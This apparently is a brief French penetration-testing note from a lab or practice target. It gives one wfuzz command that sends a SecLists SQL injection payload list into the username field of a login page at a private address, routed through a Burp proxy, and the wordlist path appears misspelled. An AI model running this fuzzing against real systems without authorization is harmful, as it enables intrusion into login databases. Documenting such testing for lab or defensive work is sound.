# Test d'injection SQL avec proxy burp pour récupérer les requêtes.
```bash
wfuzz -c -z file,/usr/share/seclists/fuzzin/SQLi/quick-SQLi.txt -d="username=FUZZ&password=attempt" -u http://192.168.120.31/login.php -p "127.0.0.1:8080:HTTP"
```